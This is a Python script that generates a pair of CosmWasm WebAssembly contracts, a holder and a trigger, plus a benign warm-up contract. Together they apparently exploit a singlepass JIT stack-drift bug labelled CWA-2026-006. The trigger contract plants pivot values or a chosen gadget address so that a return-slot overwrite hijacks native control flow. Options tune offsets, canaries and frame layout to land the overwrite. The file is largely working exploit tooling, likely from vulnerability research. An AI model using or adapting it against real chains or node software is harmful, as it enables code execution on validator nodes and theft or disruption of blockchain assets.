#!/usr/bin/env python3
"""Generate the E6b nested CosmWasm contract pair (holder + trigger).

holder.wat  : CosmWasm ABI; `execute` stages i64 locals then calls the `query` host import
              (contract-to-contract Smart query) -> suspends while the trigger runs on the
              stack above; resumes through the overwritten return slot.
trigger.wat : CosmWasm ABI; `query` runs the sparse drift loop (E4/E5 shape). Live values are
              loaded from planted qwords (data segment) = pivot gadget address + chain markers.

Usage: python3 gen_nested_contracts.py <outdir> [--offset N] [--iters N] [--dense] [--live load|computed]
       (call schedule: call db_read when (i + offset) & 511 == 0; iters = 65536 + r + 1
        is baked in as a constant chosen by the caller via --iters)
       --live computed emits the p1drift-proven computed live values instead of planted loads
       (used by the dense_computed drift probe).
"""
import argparse
import os
import struct

RESP = b'{"ok":{"messages":[],"data":null,"attributes":[],"events":[]}}'
RESP_HIT = b'{"ok":{"messages":[],"data":null,"attributes":[["hit","1"]],"events":[]}}'
TRIGGER_ADDR = "archway1khgqgnnpw984e70chqjc5yu5r3ed8255qy6mhw"  # valid bech32 (harness routes by checksum)
LIVE = 16
GADGET = 0x0042424242424242  # marker: if a planted slot lands on the return slot -> fault here


def region(offset, capacity, length):
    return struct.pack("<III", offset, capacity, length)


def esc(b):
    return "".join("\\%02x" % x for x in b)


ALLOCATOR = """  (global $heap (mut i32) (i32.const 8192))
  (func (export "allocate") (param $size i32) (result i32)
    (local $data i32) (local $region i32)
    (local.set $data (global.get $heap))
    (global.set $heap
      (i32.and (i32.add (i32.add (local.get $data) (local.get $size)) (i32.const 7)) (i32.const -8)))
    (local.set $region (global.get $heap))
    (global.set $heap (i32.add (global.get $heap) (i32.const 16)))
    (i32.store (local.get $region) (local.get $data))
    (i32.store offset=4 (local.get $region) (local.get $size))
    (i32.store offset=8 (local.get $region) (i32.const 0))
    (local.get $region))
  (func (export "deallocate") (param $ptr i32))
  (func (export "interface_version_8"))"""


def gen_holder(outdir, dummy=0, staged=10, staged_const=None):
    req = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
    # staged locals; more locals => more spill pressure => a REAL native frame growth
    # (the resume slot moves deeper, out of the guard-protected top window)
    N = staged
    # staged local values, derived from $env (distinct per slot: 0x1000..0x1009)
    if staged_const is not None:
        # computed-to-exactly-C staged values (singlepass cannot fold the runtime AND),
        # so the JIT still spills them into the native frame like the env-derived form.
        staged = [
            ("(i64.or (i64.const 0x%x) (i64.and (i64.extend_i32_u (local.get $env)) (i64.const 0)))" % staged_const)
            for i in range(N)
        ]
    else:
        staged = [
            "(i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x%04x))"
            % (0x1000 + i)
            for i in range(N)
        ]
    # $hit = OR over (l_k != staged_k); fold right for a compact expression
    conds = [f"(i64.ne (local.get $l{k}) {staged[k]})" for k in range(N)]
    hit_expr = conds[-1]
    for c in reversed(conds[:-1]):
        hit_expr = f"(i32.or {c} {hit_expr})"
    lines = [
        ";; E6b holder contract (generated).",
        ";; After the query returns, $hit reports whether the write stream corrupted the",
        ';; staged locals: corrupted -> response with attributes [["hit","1"]] (visible in',
        ";; the harness JSON), untouched -> the plain ok response.",
        "(module",
        '  (import "env" "query_chain" (func $query (param i32) (result i32)))',
        '  (memory (export "memory") 1)',
        ALLOCATOR,
        "  ;; @16 query-request region -> @64 request JSON; @32 response region -> @512 JSON",
        "  ;; @1008 hit-response region -> @1024 JSON",
        f'  (data (i32.const 16) "{esc(region(64, 256, len(req)))}")',
        f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
        f'  (data (i32.const 64) "{esc(req)}")',
        f'  (data (i32.const 512) "{esc(RESP)}")',
        f'  (data (i32.const 1008) "{esc(region(1024, 96, len(RESP_HIT)))}")',
        f'  (data (i32.const 1024) "{esc(RESP_HIT)}")',
        '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
        '  (func (export "execute") (param $env i32) (param $info i32) (param $msg i32) (result i32)',
    ]
    for i in range(0, N, 5):
        chunk = " ".join(f"(local $l{k} i64)" for k in range(i, min(i + 5, N)))
        lines.append("    " + chunk)
    lines += [
        "    (local $hit i32)",
        "    ;; stage distinctive values in locals (live across the query call)",
    ]
    if dummy > 0:
        lines.append("    " + " ".join(f"(local $d{k} i64)" for k in range(dummy)))
        lines.append("    " + " ".join(f"(local.set $d{k} (i64.const 0))" for k in range(dummy)))
    for k in range(N):
        lines.append(f"    (local.set $l{k} {staged[k]})")
    lines += [
        "    ;; suspend inside the querier while the trigger runs on the stack above",
        "    (call $query (i32.const 16))",
        "    drop",
        f"    (local.set $hit {hit_expr})",
    ]
    for k in range(dummy):
        # keep the dummy locals live across the call: OR their (zero) values into $hit
        lines.append(f"    (local.set $hit (i32.or (local.get $hit) (i32.wrap_i64 (local.get $d{k}))))")
    lines += [
        "    (if (result i32) (local.get $hit) (then (i32.const 1008)) (else (i32.const 32))))",
        ")",
        "",
    ]
    p = os.path.join(outdir, "holder.wat")
    open(p, "w").write("\n".join(lines))
    print("wrote", p, f"({len(req)}-byte request, {N}-local hit-reporting holder)")


def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None, dense_tail=0, frame32=0,
                call_kind="db_read", plant_values=None, then_val=None, spacing=512):
    if call_kind == "query":
        # host call = contract-to-contract Smart query; the Go querier callback runs
        # while this (trigger) execution is suspended -> observability hook.
        qreq = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
        call_import = '  (import "env" "query_chain" (func $host (param i32) (result i32)))'
        call_arg = "(i32.const 192)"
        extra_data = [
            f'  (data (i32.const 192) "{esc(region(208, 256, len(qreq)))}")',
            f'  (data (i32.const 208) "{esc(qreq)}")',
        ]
    else:
        call_import = '  (import "env" "db_read" (func $host (param i32) (result i32)))'
        call_arg = "(i32.const 16)"
        extra_data = []
    if plant_values:
        # per-slot canaries (hex list, applied to the register-resident slots k0..k5,
        # rest filled with the last value) -> a consumed canary identifies its slot
        seq = list(plant_values)
        vals = b"".join(struct.pack("<Q", seq[k % len(seq)]) for k in range(LIVE))
    elif plants == "gadget" and plant_addr is not None:
        # aimed pivot: every planted slot = a chosen fixed code address (e.g. a ud2
        # gadget in the non-PIE harness binary) -> a return-slot overwrite transfers
        # execution there (SIGILL with PC == the gadget proves the aimed pivot)
        vals = struct.pack("<Q", plant_addr) * LIVE
    elif plants == "distinct":
        # per-slot distinct pivot values: a crash PC reveals WHICH slot landed
        # per-slot distinct pivot values: a crash PC reveals WHICH slot landed.
        # NOTE: canonical-but-unmapped (0x0000414100000000+k) — a control transfer
        # (ret/jmp/call) to such a value faults AT THE TARGET (PC=0x41410000000k,
        # visible), whereas the older non-canonical 0x0041... form faults at the
        # branching instruction (PC stays in the consumer -> invisible).
        vals = b"".join(struct.pack("<Q", 0x0000414100000000 + k) for k in range(LIVE))
    else:
        vals = b"".join(struct.pack("<Q", GADGET) for _ in range(LIVE))
    lines = [
        ";; E6b trigger contract (generated).",
        f";; call when (i + {offset}) & 511 == 0; loop {iters} iterations" if not dense else f";; dense: call every iteration; loop {iters} iterations",
        "(module",
        call_import,
        '  (memory (export "memory") 1)',
        ALLOCATOR,
        *extra_data,
        "  ;; CRITICAL: condition @0 must be nonzero so the THEN branch executes — the",
        "  ;; CWA-2026-006 drift is emitted in the then-branch epilogue (Operator::Else);",
        "  ;; with the else branch taken the buggy cleanup never runs (zero drift).",
        '  (data (i32.const 0) "\\01\\00\\00\\00")',
        "  ;; @16 key region -> @48 one key byte; @32 response region -> @512 JSON",
        f'  (data (i32.const 16) "{esc(region(48, 1, 1))}")',
        f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
        '  (data (i32.const 48) "\\00")',
        f'  (data (i32.const 512) "{esc(RESP)}")',
        f'  (data (i32.const 64) "{esc(vals)}")',
        '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
        '  (func (export "query") (param $env i32) (param $msg i32) (result i32)',
        "    (local $i i32)",
        ("    " + " ".join(f"(local $f{k} i32)" for k in range(frame32))) if frame32 else "",
        ("    " + " ".join(f"(local.set $f{k} (i32.const 0))" for k in range(frame32))) if frame32 else "",
        "    (block $exit",
        "      (loop $l",
        "        ;; 16 live values (register pressure) — loaded qwords or computed",
    ]
    lines = [l for l in lines if l != ""]
    if live == "computed":
        # p1drift-proven shape: computed live values from the loop index
        for _ in range(LIVE):
            lines.append("        (i64.extend_i32_u (local.get $i))")
    else:
        for k in range(LIVE):
            lines.append(f"        (i64.load (i32.const {64 + 8 * k}))")
    then_expr = "(i64.add (i64.extend_i32_u (local.get $i)) (i64.const 0x12345678))"
    if then_val is not None:
        # computed-valued then-result that evaluates EXACTLY to then_val: C + (i & 0).
        # singlepass does no algebraic folding, so the value stays register-backed
        # (required for the buggy release path) while carrying an attacker constant.
        then_expr = ("(i64.add (i64.const 0x%x) (i64.and (i64.extend_i32_u (local.get $i)) (i64.const 0)))" % then_val)
    lines += [
        "        (i32.load (i32.const 0))",
        "        (if (result i64)",
        f"          (then {then_expr})",
        "          (else (i64.extend_i32_u (local.get $i))))",
        "        drop",
    ]
    if dense:
        lines += [
            f"        (call $host {call_arg})",
            "        drop",
        ]
    elif dense_tail > 0:
        # sparse schedule until the last scheduled call, then DENSE for the tail:
        # the crossing batch's deepest qword (the call return address) lands first;
        # the dense tail then re-covers the holder's slot region with 16B-step
        # batches, sweeping every batch qword (incl. the planted GPRs) onto it.
        dense_from = iters - 1 - dense_tail
        lines += [
            f"        (i32.or (i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511))) (i32.gt_u (local.get $i) (i32.const {dense_from})))",
            f"        (if (then (call $host {call_arg}) drop))",
        ]
    else:
        if spacing == 512:
            cond = f"(i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511)))"
        else:
            n_off = spacing - (offset % spacing) if offset % spacing else 0
            cond = (f"(i32.eqz (i32.rem_u (i32.add (local.get $i) (i32.const {n_off})) "
                    f"(i32.const {spacing})))")
        lines += [
            f"        {cond}",
            f"        (if (then (call $host {call_arg}) drop))",
        ]
    # keep any frame32 locals live (zero effect) so they stay in the native frame
    bound = f"(i32.const {iters})"
    for k in range(frame32):
        bound = f"(i32.add {bound} (i32.and (local.get $f{k}) (i32.const 0)))"
    lines += [
        "        " + " ".join(["drop"] * LIVE),
        "        (local.set $i (i32.add (local.get $i) (i32.const 1)))",
        f"        (br_if $l (i32.lt_u (local.get $i) {bound}))",
        "      )",
        "    )",
        "    (i32.const 32))",
        ")",
        "",
    ]
    p = os.path.join(outdir, "trigger.wat")
    open(p, "w").write("\n".join(lines))
    print("wrote", p, f"(offset={offset}, iters={iters}, dense={dense})")


def gen_benign(outdir):
    lines = [
        ";; E6b benign trigger (warm-up only): one host call, returns immediately.",
        "(module",
        '  (import "env" "db_read" (func $db_read (param i32) (result i32)))',
        '  (memory (export "memory") 1)',
        ALLOCATOR,
        f'  (data (i32.const 16) "{esc(region(48, 1, 1))}")',
        f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
        '  (data (i32.const 48) "\\00")',
        f'  (data (i32.const 512) "{esc(RESP)}")',
        '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
        '  (func (export "query") (param $env i32) (param $msg i32) (result i32)',
        "    (call $db_read (i32.const 16))",
        "    drop",
        "    (i32.const 32))",
        ")",
        "",
    ]
    p = os.path.join(outdir, "benign.wat")
    open(p, "w").write("\n".join(lines))
    print("wrote", p)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("outdir")
    ap.add_argument("--offset", type=int, default=256)
    ap.add_argument("--iters", type=int, default=65793)
    ap.add_argument("--dense", action="store_true", help="call db_read every iteration")
    ap.add_argument("--live", choices=["load", "computed"], default="load",
                    help="live-value kind: planted qword loads or computed (p1drift shape)")
    ap.add_argument("--dummy", type=int, default=0,
                    help="extra dummy holder locals (live across the call; shifts the holder frame)")
    ap.add_argument("--plants", choices=["uniform", "distinct", "gadget"], default="uniform",
                    help="trigger planted pivot values: all equal, per-slot distinct (slot-ID), or one gadget addr")
    ap.add_argument("--plant-addr", type=lambda s: int(s, 16), default=None,
                    help="fixed address planted in every slot when --plants gadget (hex)")
    ap.add_argument("--dense-tail", type=int, default=0,
                    help="after the last sparse call, call every iteration for this many iterations")
    ap.add_argument("--frame32", type=int, default=0,
                    help="extra i32 trigger locals (live in the loop) to flip 8B batch alignment parity")
    ap.add_argument("--call-query", action="store_true",
                    help="trigger loop calls query_chain (observability) instead of db_read")
    ap.add_argument("--staged", type=int, default=10,
                    help="number of holder staged locals (more => forced native frame growth)")
    ap.add_argument("--plant-values", default=None,
                    help="comma-separated per-slot canary values (hex), overrides --plants")
    ap.add_argument("--spacing", type=int, default=512,
                    help="host-call spacing in iterations (drift stride = 16*spacing bytes; default 512 = 8 KiB)")
    ap.add_argument("--staged-const", default=None,
                    help="computed-to-constant staged local value (hex) for the holder")
    ap.add_argument("--then-val", default=None,
                    help="make the drift-site computed then-result evaluate to this exact 64-bit hex constant")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    call_kind = "query" if args.call_query else "db_read"
    pv = [int(x, 16) for x in args.plant_values.split(",")] if args.plant_values else None
    tv = int(args.then_val, 16) if args.then_val else None
    sc = int(args.staged_const, 16) if args.staged_const else None
    gen_holder(args.outdir, args.dummy, args.staged, sc)
    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants,
                args.plant_addr, args.dense_tail, args.frame32, call_kind, pv, tv, args.spacing)
    gen_benign(args.outdir)


if __name__ == "__main__":
    main()
